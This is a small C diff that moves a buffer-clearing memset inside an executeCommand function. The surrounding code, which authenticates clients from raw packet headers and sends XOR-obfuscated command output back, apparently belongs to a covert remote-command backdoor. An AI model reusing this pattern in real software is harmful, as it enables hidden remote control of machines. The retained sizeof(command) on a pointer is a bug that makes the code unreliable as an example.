@@ -486,7 +486,6 @@ int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
 void executeCommand(char* command)
 {
 	char results[1024] = {0};
-	memset(results, 0, sizeof(results));
 
 	if (strcmp(command, "help") == 0) 
 	{
@@ -500,6 +499,7 @@ void executeCommand(char* command)
 	XOR(results);
 	sendCommand(addr_ptr, results);
 	memset(command, 0, sizeof(command));
+	memset(results, 0, sizeof(results));
 }
 
 /*------------------------------------------------------------------------------
